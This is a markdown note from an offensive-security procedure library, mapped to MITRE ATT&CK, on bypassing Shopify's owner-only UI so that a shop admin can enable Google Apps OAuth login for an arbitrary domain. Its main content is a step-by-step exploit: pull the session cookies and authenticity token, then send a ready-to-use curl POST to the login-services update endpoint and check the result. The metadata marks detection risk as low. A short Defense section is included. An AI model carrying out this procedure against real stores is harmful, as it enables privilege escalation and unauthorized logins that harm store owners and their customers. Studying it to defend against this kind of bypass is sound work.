---
id: 123e4567-e89b-12d3-a456-426614174001
tags:
  - privilege-escalation
  - shopify
  - oauth
  - bypass
  - api
type: procedure
tools: []
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/shopify-update-google-apps-login-post]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[Exploitation for Privilege Escalation]]'
updated_at: '2025-12-14T17:28:58.331Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Exploitation for Privilege Escalation]]'
---
---
id: 123e4567-e89b-12d3-a456-426614174001
name: Bypass-Shopify-UI-Restrictions-for-Login-Services-Update
type: procedure
verified: false
submitted: false
created_at: 2023-10-01T00:00:00Z
updated_at: 2023-10-01T00:00:00Z
tactics: [[Privilege Escalation]]
techniques: [[Valid Accounts]], [[Exploitation for Privilege Escalation]]
sub_techniques: []
tags: [privilege-escalation, shopify, oauth, bypass, api]
commands: [[commands/shopify-update-google-apps-login-post]]
platforms: [Web]
tools: []
---

# Bypass-Shopify-UI-Restrictions-for-Login-Services-Update

## Summary

This procedure exploits a privilege escalation vulnerability in Shopify by allowing shop admins to directly update external login services (e.g., Google Apps OAuth) via backend API endpoints, bypassing UI restrictions intended for account owners only. It enables unauthorized configuration changes that could allow external domain users to access the store.

## Description

In Shopify, the admin UI hides sensitive sections like 'Login Services' from shop admins to enforce owner-only access. However, the backend endpoint /admin/login_services/google_apps/update lacks proper authorization checks, permitting any authenticated staff member to send a POST request with valid session data to enable and configure OAuth integrations. This leads to potential account takeover risks if a malicious admin sets a custom domain controlled by attackers. The procedure requires an active admin session and focuses on crafting requests with authenticity tokens for CSRF protection.

## Requirements

1. Valid shop admin credentials with full access
2. Active session cookies and authenticity_token from Shopify admin login
3. HTTP client capable of sending POST requests (e.g., curl or browser dev tools)
4. Access to the target Shopify store's admin URL (e.g., https://example.myshopify.com/admin)

## Defense

Defensive measures and detection strategies:

- Implement server-side authorization checks on all admin endpoints to enforce role-based access (e.g., verify user is account owner)
- Log and monitor API calls to sensitive endpoints like /admin/login_services/* for anomalous requests from non-owner accounts
- Use rate limiting and anomaly detection on configuration changes to external services
- Audit UI-backend consistency and conduct regular privilege escalation testing

## Objectives

1. Escalate admin privileges to perform owner-only actions on login configurations
2. Enable Google Apps OAuth with a custom domain to allow unauthorized logins
3. Demonstrate bypass of client-side restrictions through direct backend manipulation

## Instructions

### Step 1: Authenticate as Shop Admin and Extract Session Data

**Context**: Establish a valid session to obtain necessary cookies and tokens for the request.

**Command** ([[commands/shopify-update-google-apps-login-post]]):

First, log in via browser to https://seclearn.myshopify.com/admin. Inspect the page source or network tab to extract the authenticity_token (from meta tag) and session cookies.

> No direct command; manual extraction. Expected output: Token like 'xxxxxPaAQQFSKgdwaJr6XWqFbBkQ%3D' and Cookie header with session ID.

### Step 2: Craft and Send the POST Request to Update Settings

**Context**: Use the extracted data to bypass UI and directly patch the Google Apps login settings, enabling it for a custom domain.

**Command** ([[commands/shopify-update-google-apps-login-post]]):
```bash
curl -X POST 'https://seclearn.myshopify.com/admin/login_services/google_apps/update' \
  -H 'Host: seclearn.myshopify.com' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0' \
  -H 'Cookie: [your-session-cookies]' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'utf8=%E2%9C%93&_method=patch&authenticity_token=[your-token]&shop%5Bgoogle_apps_login_enabled%5D=0&shop%5Bgoogle_apps_login_enabled%5D=1&shop%5Bgoogle_apps_domain%5D=securitylearn.net&commit=Save'
```

> This simulates a form submission to enable the feature (overwriting 0 to 1) and set the domain. Expected output: 200 OK or redirect; check response body for success message like 'Settings updated'.

### Step 3: Verify the Update

**Context**: Confirm the change took effect by inspecting from an owner account.

Log in as owner and check Settings > Account > Login Services.

> Expected output: Enabled Google Apps with domain 'securitylearn.net' visible, confirming escalation success.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Valid Accounts]] Valid Accounts
- [[Exploitation for Privilege Escalation]] Exploitation for Privilege Escalation

### Sub-Techniques


## Commands Used

- [[commands/shopify-update-google-apps-login-post]]

## Tools Used


## Tags

- [[privilege-escalation]]
- [[shopify]]
- [[oauth]]
- [[bypass]]
- [[api]]
